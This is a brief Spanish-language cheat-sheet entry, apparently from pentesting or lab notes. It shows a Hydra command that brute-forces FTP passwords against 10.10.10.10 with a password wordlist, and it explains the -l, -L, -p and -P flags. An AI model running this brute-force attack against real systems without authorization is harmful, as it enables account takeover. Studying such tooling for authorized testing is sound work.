### Ataque fuerza bruta contraseñas FTP con Hydra

```bash
hydra -l <usuario> -P passwords.txt ftp://10.10.10.10
```

* -l minúscula especifica un usuario en concreto
* -L mayúscila especifica un diccionario de usuarios
* -p minúscula (mismo para contraseñas)
* -P mayúscula (mismo para  contraseñas)
